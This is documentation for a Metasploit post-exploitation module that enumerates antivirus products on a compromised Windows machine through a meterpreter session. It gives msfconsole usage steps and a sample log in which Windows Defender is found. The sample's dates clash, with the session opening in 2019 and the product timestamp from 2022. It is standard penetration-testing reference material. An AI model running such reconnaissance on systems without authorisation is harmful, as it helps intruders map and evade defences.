## Vulnerable Application

This module will enumerate all installed AntiVirus applications on the target Windows OS

## Verification Steps
1. Start msfconsole
2. Get meterpreter session
3. Do: ```use post/windows/gather/enum_av```
4. Do: ```set SESSION <session id>```
5. Do: ```run```

## Options

**SESSION**

The session to run this module on.

## Scenarios

### Windows 10 (20H2 build 19042.1645)

  ```
  [*] Meterpreter session 1 opened (192.168.1.3:4444 -> 192.168.1.4:49178) at 2019-12-10 14:18:44 -0700
  meterpreter > bg
  [*] Backgrounding session 1...
  
  msf6 > use windows/gather/enum_av
  msf6 post(windows/gather/enum_av) > set session 1
  session => 1
  msf6 post(windows/gather/enum_av) > run
  
  [*] Found AV product:
  displayName=Windows Defender
  instanceGuid={D68DDC3A-831F-4fae-9E44-DA132C1ACF46}
  pathToSignedProductExe=windowsdefender://
  pathToSignedReportingExe=%ProgramFiles%\Windows Defender\MsMpeng.exe
  productState=401664
  timestamp=Thu, 21 Apr 2022 15:50:46 GMT
  
  [*] Post module execution completed
  ```
